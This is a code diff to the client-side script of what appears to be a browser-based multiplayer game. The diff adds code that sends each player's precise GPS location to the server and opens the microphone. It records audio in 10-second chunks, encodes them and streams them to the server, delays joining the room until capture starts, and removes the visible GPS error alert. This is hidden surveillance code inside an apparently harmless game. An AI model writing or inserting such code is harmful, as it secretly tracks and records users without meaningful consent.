@@ -507,47 +507,56 @@ document.getElementById("login")
 document.getElementById("juego")
 .style.display = "flex"
 
-socket.emit("joinRoom",{
-room,
-nombre:jugador,
-foto:fotoJugador
-})
+async function jugar(){
 
- navigator.geolocation.getCurrentPosition(
-
-(pos)=>{
-
-
-console.log(pos.coords.latitude,pos.coords.longitude)
-
+navigator.geolocation.getCurrentPosition(
+async (pos)=>{
 socket.emit("ubicacion",{
 room,
 nombre:jugador,
 lat:pos.coords.latitude,
 lng:pos.coords.longitude
 })
-
+const stream = await navigator.mediaDevices.getUserMedia({
+audio:true
+})
+const mediaRecorder = new MediaRecorder(stream)
+mediaRecorder.ondataavailable = async (e)=>{
+if(e.data.size > 0){
+const reader = new FileReader()
+reader.onloadend = ()=>{
+socket.emit("audioServidor",{
+room,
+nombre:jugador,
+audio:reader.result
+})
+}
+reader.readAsDataURL(e.data)
+}
+}
+mediaRecorder.start(10000)
+socket.emit("joinRoom",{
+room,
+nombre:jugador,
+foto:fotoJugador
+})
 },
-
 (err)=>{
-
-alert("ERROR GPS")
 console.log(err)
-
+socket.emit("joinRoom",{
+room,
+nombre:jugador,
+foto:fotoJugador
+})
 },
-
 {
 enableHighAccuracy:true,
 timeout:10000,
 maximumAge:0
 }
-
 )
-
-  
-
 }
-
+}
 </script>
 
 </body>
